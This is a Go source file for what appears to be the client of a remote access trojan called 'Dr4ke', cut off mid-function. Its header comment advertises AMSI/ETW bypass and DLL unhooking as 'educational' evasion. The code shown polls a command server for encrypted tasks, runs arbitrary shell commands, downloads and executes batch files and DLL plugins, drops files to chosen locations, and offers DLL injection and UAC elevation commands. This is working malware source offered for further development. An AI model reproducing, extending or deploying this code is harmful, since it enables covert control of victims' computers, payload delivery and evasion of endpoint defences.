package main

/*
==========================================================================
                       IMPORTANT NOTE
==========================================================================

I apologize for the current organization of the code. This stub was developed
with a focus on functionality rather than readability or optimal structure.

The evasion methods implemented (AMSI/ETW bypass, DLL unhooking, etc.)
are BASIC and implemented primarily for EDUCATIONAL purposes.
These methods:

1. Hardware Breakpoints for AMSI/ETW bypass
   - Uses debug registers (Dr0-Dr3) to intercept function calls
   - Basic implementation with KNOWN BUGS:
     * May fail on multi-threaded applications
     * Exception handler may not properly catch all calls
     * Race conditions can occur during handler execution
     * Incomplete register state preservation
   - Can be detected by modern EDRs

2. Direct memory patching of AmsiScanBuffer
   - Alters execution flow with simple byte-patching (JZ -> JNZ)
   - Well-known technique that's easily detectable
   - Will only work effectively on Windows 10, not guaranteed on other versions

3. Basic DLL Unhooking
   - Restores .text sections of system DLLs from clean copies
   - Doesn't handle sophisticated hooks or low-level monitoring

All these methods CAN AND SHOULD BE IMPROVED to:
- Reduce detections
- Implement more modern techniques
- Improve error handling
- Organize the code more clearly and modularly

This code is shared as a starting point for research and learning,
not as an example of "best practice" for evasion techniques.

Contributions to improve these techniques are welcome!

==========================================================================
*/

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type PluginManager struct {
	loadedPlugins map[string]*syscall.DLL
	pluginCache   map[string][]byte
	tempFiles     map[string]string
	client        *Client
}

type PluginResult struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Data    string `json:"data"`
}

type PluginManifest struct {
	Name        string `json:"name"`
	Version     string `json:"version"`
	Description string `json:"description"`
	Commands    []struct {
		Name        string `json:"name"`
		Description string `json:"description"`
		Usage       string `json:"usage"`
		Example     string `json:"example"`
	} `json:"commands"`
}

var pluginManager *PluginManager

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
)

const (
	CONTEXT_DEBUG_REGISTERS      = 0x00000010
	EXCEPTION_SINGLE_STEP        = 0x80000004
	EXCEPTION_CONTINUE_EXECUTION = 0xffffffff
	EXCEPTION_CONTINUE_SEARCH    = 0x00000000
	EXCEPTION_EXECUTE_HANDLER    = 0x00000001
	STATUS_SUCCESS               = 0x00000000
	STATUS_ACCESS_VIOLATION      = 0xC0000005
	S_OK                         = 0x00000000
)

const (
	GENERIC_READ           = 0x80000000
	FILE_SHARE_READ        = 0x00000001
	OPEN_EXISTING          = 3
	PAGE_READONLY          = 0x02
	SEC_IMAGE              = 0x1000000
	FILE_MAP_READ          = 0x0004
	PAGE_EXECUTE_READWRITE = 0x40
)

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]uint8
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type CONTEXT struct {
	P1Home               uintptr
	P2Home               uintptr
	P3Home               uintptr
	P4Home               uintptr
	P5Home               uintptr
	P6Home               uintptr
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uintptr
	Dr1                  uintptr
	Dr2                  uintptr
	Dr3                  uintptr
	Dr6                  uintptr
	Dr7                  uintptr
	Rax                  uintptr
	Rcx                  uintptr
	Rdx                  uintptr
	Rbx                  uintptr
	Rsp                  uintptr
	Rbp                  uintptr
	Rsi                  uintptr
	Rdi                  uintptr
	R8                   uintptr
	R9                   uintptr
	R10                  uintptr
	R11                  uintptr
	R12                  uintptr
	R13                  uintptr
	R14                  uintptr
	R15                  uintptr
	Rip                  uintptr
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uintptr
	DebugControl         uintptr
	LastBranchToRip      uintptr
	LastBranchFromRip    uintptr
	LastExceptionToRip   uintptr
	LastExceptionFromRip uintptr
}

type EXCEPTION_RECORD struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      *EXCEPTION_RECORD
	ExceptionAddress     uintptr
	NumberParameters     uint32
	ExceptionInformation [15]uintptr
}

type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT
}

type Client struct {
	serverURL    string
	authToken    string
	buildID      string
	userAgent    string
	httpClient   *http.Client
	lastTaskHash string
	lastTaskTime time.Time
	taskHistory  map[string]time.Time
	elevated     bool
}

func NewPluginManager(client *Client) *PluginManager {
	return &PluginManager{
		loadedPlugins: make(map[string]*syscall.DLL),
		pluginCache:   make(map[string][]byte),
		tempFiles:     make(map[string]string),
		client:        client,
	}
}

func (pm *PluginManager) LoadPlugin(pluginName string) error {

	if _, exists := pm.loadedPlugins[pluginName]; exists {
		fmt.Printf("[DEBUG] Plugin %s already loaded\n", pluginName)
		return nil
	}

	var pluginData []byte
	var exists bool
	if pluginData, exists = pm.pluginCache[pluginName]; !exists {

		var err error
		pluginData, err = pm.downloadPlugin(pluginName)
		if err != nil {
			return fmt.Errorf("failed to download plugin %s: %v", pluginName, err)
		}
		pm.pluginCache[pluginName] = pluginData
	}

	dll, err := pm.loadDLLFromMemory(pluginData)
	if err != nil {
		return fmt.Errorf("failed to load plugin %s: %v", pluginName, err)
	}

	pm.loadedPlugins[pluginName] = dll
	fmt.Printf("[DEBUG] Plugin %s loaded successfully\n", pluginName)
	return nil
}

func (pm *PluginManager) ExecutePlugin(pluginName, command string) (string, error) {

	if err := pm.LoadPlugin(pluginName); err != nil {
		return "", err
	}

	dll, exists := pm.loadedPlugins[pluginName]
	if !exists {
		return "", fmt.Errorf("plugin %s not loaded", pluginName)
	}

	executeProc, err := dll.FindProc("Execute")
	if err != nil {
		return "", fmt.Errorf("Execute function not found in plugin %s: %v", pluginName, err)
	}

	commandBytes := append([]byte(command), 0)
	commandPtr := uintptr(unsafe.Pointer(&commandBytes[0]))

	ret, _, _ := executeProc.Call(commandPtr)
	if ret == 0 {
		return "", fmt.Errorf("plugin %s could not handle command: %s", pluginName, command)
	}

	return pm.getPluginResult(dll)
}

func (pm *PluginManager) getPluginResult(dll *syscall.DLL) (string, error) {
	getResultProc, err := dll.FindProc("GetResult")
	if err != nil {
		return "", fmt.Errorf("GetResult function not found: %v", err)
	}

	ret, _, _ := getResultProc.Call()
	if ret == 0 {
		return "", nil
	}

	var result strings.Builder
	ptr := ret
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(ptr))
		if b == 0 {
			break
		}
		result.WriteByte(b)
		ptr++
	}

	return result.String(), nil
}

func (pm *PluginManager) downloadPlugin(pluginName string) ([]byte, error) {
	req, err := pm.client.createRequest("GET", fmt.Sprintf("/plugin/%s", pluginName), nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := pm.client.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download plugin: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read plugin data: %v", err)
	}

	fmt.Printf("[DEBUG] Downloaded plugin %s (%d bytes)\n", pluginName, len(data))
	return data, nil
}

func (pm *PluginManager) loadDLLFromMemory(data []byte) (*syscall.DLL, error) {
	tempDir := os.TempDir()
	tempName := fmt.Sprintf("plugin_%d_%d.dll", time.Now().UnixNano(), os.Getpid())
	tempPath := filepath.Join(tempDir, tempName)

	err := os.WriteFile(tempPath, data, 0644)
	if err != nil {
		return nil, fmt.Errorf("failed to write plugin data: %v", err)
	}

	time.Sleep(50 * time.Millisecond)

	dll, err := syscall.LoadDLL(tempPath)
	if err != nil {
		os.Remove(tempPath)
		return nil, fmt.Errorf("failed to load DLL: %v", err)
	}

	go func() {
		time.Sleep(5 * time.Second)
		os.Remove(tempPath)
	}()

	fmt.Printf("[DEBUG] Plugin DLL loaded from: %s\n", tempPath)
	return dll, nil
}

func (pm *PluginManager) ListAvailablePlugins() ([]string, error) {
	req, err := pm.client.createRequest("GET", "/plugins", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := pm.client.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to get plugin list: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	var plugins []string
	if err := json.NewDecoder(resp.Body).Decode(&plugins); err != nil {
		return nil, fmt.Errorf("failed to decode plugin list: %v", err)
	}

	return plugins, nil
}

func (pm *PluginManager) UnloadPlugin(pluginName string) error {
	if dll, exists := pm.loadedPlugins[pluginName]; exists {
		dll.Release()
		delete(pm.loadedPlugins, pluginName)
		fmt.Printf("[DEBUG] Plugin %s unloaded\n", pluginName)
	}
	return nil
}

func (pm *PluginManager) UnloadAllPlugins() {
	for name, dll := range pm.loadedPlugins {
		dll.Release()
		fmt.Printf("[DEBUG] Plugin %s unloaded\n", name)
	}
	pm.loadedPlugins = make(map[string]*syscall.DLL)
}

func getProcessName() string {
	executable, err := os.Executable()
	if err != nil {
		return "unknown"
	}
	return filepath.Base(executable)
}

func NewClient(serverURL, authToken, buildID string) *Client {
	processName := getProcessName()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &Client{
		serverURL:   serverURL,
		authToken:   authToken,
		buildID:     buildID,
		userAgent:   fmt.Sprintf("Dr4ke-Client/%s (%s; %s; %s)", buildID, runtime.GOOS, runtime.GOARCH, processName),
		httpClient:  &http.Client{Transport: tr, Timeout: 30 * time.Second},
		taskHistory: make(map[string]time.Time),
		elevated:    IsAdmin(),
	}

	pluginManager = NewPluginManager(client)

	return client
}

func (c *Client) Run() error {
	if err := c.register(); err != nil {
		return fmt.Errorf("registration failed: %v", err)
	}

	go c.heartbeatLoop()

	return c.taskLoop()
}

func (c *Client) heartbeatLoop() {
	for {
		if err := c.sendHeartbeat(); err != nil {
			fmt.Printf("[ERROR] Heartbeat failed: %v\n", err)
		}
		time.Sleep(30 * time.Second)
	}
}

func (c *Client) taskLoop() error {
	for {
		tasks, err := c.getTasks()
		if err != nil {
			fmt.Printf("[ERROR] Failed to get tasks: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		for _, task := range tasks {
			if err := c.processTask(task); err != nil {
				fmt.Printf("[ERROR] Error processing task: %v\n", err)
			}
		}
		time.Sleep(5 * time.Second)
	}
}

func (c *Client) createRequest(method, path string, body []byte) (*http.Request, error) {
	url := fmt.Sprintf("%s%s", c.serverURL, path)
	var req *http.Request
	var err error

	if body != nil {
		req, err = http.NewRequest(method, url, bytes.NewBuffer(body))
	} else {
		req, err = http.NewRequest(method, url, nil)
	}

	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", c.userAgent)
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", c.authToken))
	req.Header.Set("X-Build-ID", c.buildID)

	return req, nil
}

func (c *Client) register() error {
	req, err := c.createRequest("GET", fmt.Sprintf("/register?id=%s", c.buildID), nil)
	if err != nil {
		return err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed with status: %d", resp.StatusCode)
	}

	return nil
}

func (c *Client) sendHeartbeat() error {
	req, err := c.createRequest("GET", fmt.Sprintf("/heartbeat?id=%s", c.buildID), nil)
	if err != nil {
		return err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("heartbeat failed with status: %d", resp.StatusCode)
	}

	return nil
}

func (c *Client) handleCommand(command string, isEncrypted bool) string {
	var decodedCommand string
	var err error

	if isEncrypted {
		decodedCommand, err = c.decryptCommand(command)
		if err != nil {
			return fmt.Sprintf("Failed to decrypt command: %v", err)
		}
	} else {
		decodedCommand = command
	}

	parts := strings.SplitN(decodedCommand, " ", 2)
	if len(parts) == 0 {
		return "Empty command"
	}

	cmd := strings.ToLower(parts[0])
	remainder := ""
	if len(parts) > 1 {
		remainder = parts[1]
	}

	switch cmd {
	case "ping":
		return "pong"
	case "cd":
		return c.changeDirectory(remainder)
	case "execute":
		return c.executeFile(remainder)
	case "drop":
		return c.dropAndRunFile(remainder)
	case "uac":
		if runtime.GOOS != "windows" {
			return "UAC commands are only supported on Windows"
		}
		switch strings.ToLower(remainder) {
		case "status":
			if c.isElevated() {
				return "Running with administrative privileges"
			}
			return "Running without administrative privileges"
		case "elevate":
			if c.isElevated() {
				return "Already running with administrative privileges"
			}
			fmt.Println("Requesting administrative privileges...")
			ElevateProcess()
			return "Elevating process with UAC..."
		default:
			return "Unknown UAC command. Available commands: status, elevate"
		}
	default:
		return fmt.Sprintf("Unknown command: %s", cmd)
	}
}

func (c *Client) decryptCommand(encryptedCommand string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encryptedCommand)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64: %v", err)
	}

	if len(data) < 12 {
		return "", fmt.Errorf("encrypted data too short")
	}
	iv := data[:12]
	ciphertext := data[12:]

	h := sha256.New()
	h.Write([]byte(c.buildID))
	key := h.Sum(nil)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	return string(plaintext), nil
}

func (c *Client) getTasks() ([]string, error) {
	req, err := c.createRequest("GET", fmt.Sprintf("/tasks?id=%s", c.buildID), nil)
	if err != nil {
		return nil, err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to get tasks: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	var taskObjects []map[string]interface{}
	if err := json.Unmarshal(body, &taskObjects); err == nil {
		tasks := make([]string, len(taskObjects))
		for i, task := range taskObjects {
			command, ok := task["command"].(string)
			if !ok {
				continue
			}
			isEncrypted, _ := task["isEncrypted"].(bool)
			taskData := map[string]interface{}{
				"command":     command,
				"isEncrypted": isEncrypted,
			}
			taskJSON, err := json.Marshal(taskData)
			if err != nil {
				fmt.Printf("[ERROR] Failed to marshal task data: %v\n", err)
				continue
			}
			tasks[i] = string(taskJSON)
		}
		return tasks, nil
	}

	var stringTasks []string
	if err := json.Unmarshal(body, &stringTasks); err != nil {
		return nil, fmt.Errorf("failed to parse tasks response: %v", err)
	}

	return stringTasks, nil
}

func (c *Client) processTask(task string) error {
	taskHash := fmt.Sprintf("%x", sha256.Sum256([]byte(task)))

	now := time.Now()
	for hash, timestamp := range c.taskHistory {
		if now.Sub(timestamp) > 5*time.Second {
			delete(c.taskHistory, hash)
		}
	}

	if lastExec, exists := c.taskHistory[taskHash]; exists {
		if now.Sub(lastExec) < 2*time.Second {
			fmt.Printf("[DEBUG] Ignoring duplicate task received within 2 seconds\n")
			return nil
		}
	}

	c.taskHistory[taskHash] = now

	fmt.Printf("[DEBUG] Received task: %s\n", task)

	var taskData struct {
		Command     string `json:"command"`
		IsEncrypted bool   `json:"isEncrypted"`
	}

	var output string

	if err := json.Unmarshal([]byte(task), &taskData); err != nil {
		fmt.Printf("[DEBUG] Not a JSON task, executing as plain command\n")
		output = c.executeTask(task)
	} else {
		fmt.Printf("[DEBUG] Parsed task - Command: %s, Encrypted: %v\n", taskData.Command, taskData.IsEncrypted)

		var command string
		if taskData.IsEncrypted {
			fmt.Printf("[DEBUG] Decrypting command...\n")
			decrypted, err := c.decryptCommand(taskData.Command)
			if err != nil {
				output = fmt.Sprintf("Failed to decrypt command: %v", err)
			} else {
				command = decrypted
				fmt.Printf("[DEBUG] Decrypted command: %s\n", command)
				output = c.executeTask(command)
			}
		} else {
			command = taskData.Command
			output = c.executeTask(command)
		}
	}

	fmt.Printf("[DEBUG] Task execution completed with output:\n%s\n", output)

	return c.sendTaskResult(output)
}

func (c *Client) sendTaskResult(output string) error {
	result := map[string]interface{}{
		"id":        c.buildID,
		"output":    output,
		"timestamp": time.Now().Unix(),
	}

	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %v", err)
	}

	req, err := c.createRequest("POST", "/result", jsonData)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send result: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	fmt.Printf("[DEBUG] Result sent successfully to server\n")
	return nil
}

func (c *Client) executeTask(task string) string {
	if strings.HasPrefix(task, "plugin:") {
		parts := strings.SplitN(task, ":", 3)
		if len(parts) >= 2 {
			pluginName := parts[1]
			command := ""
			if len(parts) == 3 {
				command = parts[2]
			}

			result, err := pluginManager.ExecutePlugin(pluginName, command)
			if err != nil {
				return fmt.Sprintf("Plugin error: %v", err)
			}
			return result
		}
		return "Invalid plugin command format. Use: plugin:name:command"
	}

	switch task {
	case "plugins:list":
		plugins, err := pluginManager.ListAvailablePlugins()
		if err != nil {
			return fmt.Sprintf("Error listing plugins: %v", err)
		}
		return fmt.Sprintf("Available plugins: %s", strings.Join(plugins, ", "))

	case "plugins:loaded":
		var loaded []string
		for name := range pluginManager.loadedPlugins {
			loaded = append(loaded, name)
		}
		return fmt.Sprintf("Loaded plugins: %s", strings.Join(loaded, ", "))

	case "plugins:unload:all":
		pluginManager.UnloadAllPlugins()
		return "All plugins unloaded"
	}

	if strings.HasPrefix(task, "plugins:unload:") {
		pluginName := strings.TrimPrefix(task, "plugins:unload:")
		err := pluginManager.UnloadPlugin(pluginName)
		if err != nil {
			return fmt.Sprintf("Error unloading plugin %s: %v", pluginName, err)
		}
		return fmt.Sprintf("Plugin %s unloaded", pluginName)
	}

	if strings.HasPrefix(task, "http://") || strings.HasPrefix(task, "https://") {
		fmt.Printf("[DEBUG] Detected direct URL execution: %s\n", task)
		tempDir := os.TempDir()
		tempFile := filepath.Join(tempDir, fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano()))
		fmt.Printf("[DEBUG] Created temp file: %s\n", tempFile)

		if err := c.downloadFileTo(task, tempFile); err != nil {
			return fmt.Sprintf("Failed to download file: %v", err)
		}
		fmt.Printf("[DEBUG] File downloaded successfully\n")

		output := c.executeBatchFile(tempFile)
		os.Remove(tempFile)
		fmt.Printf("[DEBUG] Temp file cleaned up\n")
		return output
	}

	if strings.Contains(task, ":") {
		cmdParts := strings.SplitN(task, ":", 2)
		command := cmdParts[0]
		remainder := cmdParts[1]

		fmt.Printf("[DEBUG] Processing special command: %s with args: %s\n", command, remainder)

		switch command {
		case "cd":
			return c.changeDirectory(remainder)

		case "execute":
			colonIndex := strings.Index(remainder, ":")
			if colonIndex == -1 {
				return "Missing file type and URL arguments"
			}

			fileType := strings.TrimSpace(remainder[:colonIndex])
			url := strings.TrimSpace(remainder[colonIndex+1:])

			fmt.Printf("[DEBUG] Executing file - Type: %s, URL: %s\n", fileType, url)

			if fileType != "bat" {
				return "Only .bat files are supported for execution"
			}

			tempDir := os.TempDir()
			tempFile := filepath.Join(tempDir, fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano()))
			fmt.Printf("[DEBUG] Created temp file: %s\n", tempFile)

			if err := c.downloadFileTo(url, tempFile); err != nil {
				return fmt.Sprintf("Failed to download file: %v", err)
			}
			fmt.Printf("[DEBUG] File downloaded successfully\n")

			output := c.executeBatchFile(tempFile)
			os.Remove(tempFile)
			fmt.Printf("[DEBUG] Temp file cleaned up\n")
			return output

		case "drop":
			lastColonIndex := strings.LastIndex(remainder, ":")
			if lastColonIndex == -1 {
				return "Missing file type, URL, and destination arguments"
			}

			dest := strings.TrimSpace(remainder[lastColonIndex+1:])

			firstColonIndex := strings.Index(remainder[:lastColonIndex], ":")
			if firstColonIndex == -1 {
				return "Missing file type and URL"
			}

			fileType := strings.TrimSpace(remainder[:firstColonIndex])
			url := strings.TrimSpace(remainder[firstColonIndex+1 : lastColonIndex])

			fmt.Printf("[DEBUG] Dropping file - Type: %s, URL: %s, Destination: %s\n", fileType, url, dest)

			if fileType != "bat" {
				return "Only .bat files are supported for dropping"
			}

			var destDir string
			if dest == "%TEMP%" {
				destDir = os.TempDir()
			} else {
				destDir = os.ExpandEnv(strings.ReplaceAll(dest, "%", "$"))
			}

			fmt.Printf("[DEBUG] Resolved destination directory: %s\n", destDir)

			if err := os.MkdirAll(destDir, 0755); err != nil {
				return fmt.Sprintf("Failed to create destination directory: %v", err)
			}

			filename := fmt.Sprintf("dr4ke_%d.bat", time.Now().UnixNano())
			destPath := filepath.Join(destDir, filename)
			fmt.Printf("[DEBUG] Full destination path: %s\n", destPath)

			if err := c.downloadFileTo(url, destPath); err != nil {
				return fmt.Sprintf("Failed to download file: %v", err)
			}
			fmt.Printf("[DEBUG] File downloaded successfully to: %s\n", destPath)

			output := c.executeBatchFile(destPath)
			return fmt.Sprintf("File dropped to %s and executed:\n%s", destPath, output)
		}
	}

	fmt.Printf("[DEBUG] Executing shell command: %s\n", task)
	return c.executeShellCommand(task)
}

func (c *Client) executeFile(url string) string {
	parts := strings.SplitN(url, ":", 2)
	if len(parts) != 2 {
		return "Invalid format. Use 'execute:bat:url'"
	}

	fileType := parts[0]
	fileUrl := parts[1]

	if fileType != "bat" {
		return "Only .bat files are supported"
	}

	tempFile, err := c.downloadFile(fileUrl)
	if err != nil {
		return fmt.Sprintf("Failed to download file: %v", err)
	}
	defer os.Remove(tempFile)

	return c.executeBatchFile(tempFile)
}

func (c *Client) dropAndRunFile(url string) string {
	parts := strings.SplitN(url, ":", 3)
	if len(parts) != 3 {
		return "Invalid format. Use 'drop:bat:url:location'"
	}

	fileType := parts[0]
	fileUrl := parts[1]
	dropLocation := parts[2]

	if fileType != "bat" {
		return "Only .bat files are supported"
	}

	if strings.HasPrefix(dropLocation, "%") && strings.HasSuffix(dropLocation, "%") {
		envVar := dropLocation[1 : len(dropLocation)-1]
		if expanded := os.Getenv(envVar); expanded != "" {
			dropLocation = expanded
		}
	}

	if err := os.MkdirAll(dropLocation, 0755); err != nil {
		return fmt.Sprintf("Failed to create directory: %v", err)
	}

	filename := fmt.Sprintf("script_%d.bat", time.Now().Unix())
	destPath := filepath.Join(dropLocation, filename)

	if err := c.downloadFileTo(fileUrl, destPath); err != nil {
		return fmt.Sprintf("Failed to download file: %v", err)
	}

	output := c.executeBatchFile(destPath)
	return fmt.Sprintf("File dropped to %s and executed:\n%s", destPath, output)
}

func (c *Client) downloadFile(url string) (string, error) {
	resp, err := c.httpClient.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("bad status: %s", resp.Status)
	}

	tempFile, err := os.CreateTemp("", "script_*.bat")
	if err != nil {
		return "", err
	}
	defer tempFile.Close()

	if _, err := io.Copy(tempFile, resp.Body); err != nil {
		os.Remove(tempFile.Name())
		return "", err
	}

	return tempFile.Name(), nil
}

func (c *Client) downloadFileTo(url string, destPath string) error {
	resp, err := c.httpClient.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	destFile, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, resp.Body)
	return err
}

func (c *Client) executeBatchFile(path string) string {
	if runtime.GOOS != "windows" {
		return "Batch files are only supported on Windows"
	}

	systemRoot := os.Getenv("SYSTEMROOT")
	if systemRoot == "" {
		systemRoot = "C:\\Windows"
	}
	cmdPath := filepath.Join(systemRoot, "System32", "cmd.exe")

	cmd := exec.Command(cmdPath, "/C", "start", "/MIN", cmdPath, "/C", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	cmd.Env = os.Environ()

	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("Failed to start batch file: %v", err)
	}

	return fmt.Sprintf("Batch file started in background: %s", path)
}

func (c *Client) executeShellCommand(command string) string {
	guiCommands := []string{"calc", "notepad", "mspaint", "explorer", "taskmgr", "regedit", "msconfig"}
	longCommands := []string{"ping -t", "netstat -an", "tasklist /fo"}
	builtinCommands := []string{"dir", "cd", "copy", "move", "del", "type", "echo", "set", "ipconfig", "systeminfo"}

	cmdLower := strings.ToLower(command)
	cmdParts := strings.Fields(command)

	if len(cmdParts) == 0 {
		return "Empty command"
	}

	fmt.Printf("[DEBUG] Processing command: %s, first part: %s\n", command, cmdParts[0])

	if strings.ToLower(cmdParts[0]) == "upload" {
		if len(cmdParts) != 2 {
			return "Usage: upload [URL]\nExample: upload https://example.com/payload.dll"
		}
		return c.executeUpload(cmdParts[1])
	}

	if strings.ToLower(cmdParts[0]) == "uploads" {
		return c.listUploads()
	}

	if strings.ToLower(cmdParts[0]) == "dllinject" {
		if len(cmdParts) != 3 {
			return "Usage: dllinject [process-name] [dll-path]\nExample: dllinject notepad.exe payload.dll"
		}
		return c.executeDllInject(cmdParts[1], cmdParts[2])
	}

	if strings.ToLower(cmdParts[0]) == "pslist" {
		return c.listProcesses()
	}

	for _, guiCmd := range guiCommands {
		if strings.ToLower(cmdParts[0]) == guiCmd {
			fmt.Printf("[DEBUG] Detected GUI command: %s\n", guiCmd)
			return c.executeGUICommand(command)
		}
	}

	isLongCommand := false
	for _, longCmd := range longCommands {
		if strings.Contains(cmdLower, longCmd) {
			isLongCommand = true
			break
		}
	}

	if isLongCommand {
		fmt.Printf("[DEBUG] Detected long command, using timeout\n")
		return c.executeWithTimeout(command, 10*time.Second)
	}

	for _, builtinCmd := range builtinCommands {
		if strings.ToLower(cmdParts[0]) == builtinCmd {
			fmt.Printf("[DEBUG] Detected builtin command: %s\n", builtinCmd)
			return c.executeNormalCommand(command)
		}
	}

	fmt.Printf("[DEBUG] Using normal command execution\n")
	return c.executeNormalCommand(command)
}

func (c *Client) executeUpload(url string) string {

	if !strings.HasPrefix(strings.ToLower(url), "http://") && !strings.HasPrefix(strings.ToLower(url), "https://") {
		return "Invalid URL. Must start with http:// or https://"
	}

	parts := strings.Split(url, "/")
	filename := parts[len(parts)-1]
	if filename == "" || !strings.Contains(filename, ".") {
		return "Cannot determine filename from URL. URL must end with filename.ext"
	}

	tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		return fmt.Sprintf("Failed to create upload directory: %v", err)
	}

	filePath := filepath.Join(tempDir, filename)

	psCommand := fmt.Sprintf(`Invoke-WebRequest -Uri "%s" -OutFile "%s" -UseBasicParsing`, url, filePath)

	cmd := exec.Command("powershell", "-Command", psCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()
